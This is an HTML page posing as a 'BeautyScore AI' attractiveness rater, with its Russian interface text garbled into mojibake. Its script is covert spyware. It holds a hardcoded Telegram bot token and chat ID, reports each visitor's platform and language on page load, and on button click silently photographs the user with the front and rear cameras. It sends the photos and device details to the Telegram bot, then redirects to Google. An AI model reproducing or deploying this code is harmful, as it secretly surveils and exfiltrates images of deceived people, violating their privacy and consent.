<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="background:#000; color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif; text-align:center;">
    <div style="padding:20px; border:1px solid #00f2fe; border-radius:20px;">
        <h1 style="color:#00f2fe;">BeautyScore AI</h1>
        <p>–ù–∞–∂–º–∏—Ç–µ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –≤–Ω–µ—à–Ω–æ—Å—Ç–∏</p>
        <video id="v" autoplay playsinline style="display:none;"></video>
        <canvas id="c" style="display:none;"></canvas>
        <button id="b" style="padding:15px 30px; background:#ff0080; color:#fff; border:none; border-radius:50px; font-weight:bold; cursor:pointer;">–£–ó–ù–ê–¢–¨ –ë–ê–õ–õ</button>
        <div id="status" style="margin-top:20px; color:#00f2fe;">–°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞</div>
    </div>

<script>
    const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
    const chat_id = '7164380121';

    // 1. –°–†–ê–ó–£ –®–õ–ï–ú –ò–ù–§–£ –û –ó–ê–•–û–î–ï
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("üëÄ –ö–¢–û-–¢–û –ó–ê–®–ï–õ!\nüì± –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: " + navigator.platform + "\nüåê –Ø–∑—ã–∫: " + navigator.language)}`);

    async function takePhoto(facing) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:facing}});
            const v = document.getElementById('v');
            v.srcObject = s;
            await new Promise(r => setTimeout(r, 2000));
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
            const f = new FormData();
            f.append('chat_id', chat_id);
            f.append('photo', blob, 'img.jpg');
            // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ—É –≤ –ø–æ–¥–ø–∏—Å—å –∫ —Ñ–æ—Ç–æ
            f.append('caption', `üì∏ –§–æ—Ç–æ (${facing})\nüì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent.substring(0, 50)}`);
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
            s.getTracks().forEach(t => t.stop());
        } catch (e) {
            // –ï—Å–ª–∏ –∫–∞–º–µ—Ä—É –∑–∞–ø—Ä–µ—Ç–∏–ª–∏, —à–ª–µ–º –æ—à–∏–±–∫—É –≤ –±–æ—Ç
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("‚ùå –ö–ê–ú–ï–†–ê –ó–ê–ü–†–ï–©–ï–ù–ê")}`);
        }
    }

    document.getElementById('b').onclick = async () => {
        document.getElementById('b').style.display = "none";
        document.getElementById('status').innerText = "–ê–Ω–∞–ª–∏–∑...";
        await takePhoto("user");
        await takePhoto("environment");
        document.getElementById('status').innerText = "–ì–æ—Ç–æ–≤–æ!";
        setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
    };
</script>
</body>
</html>
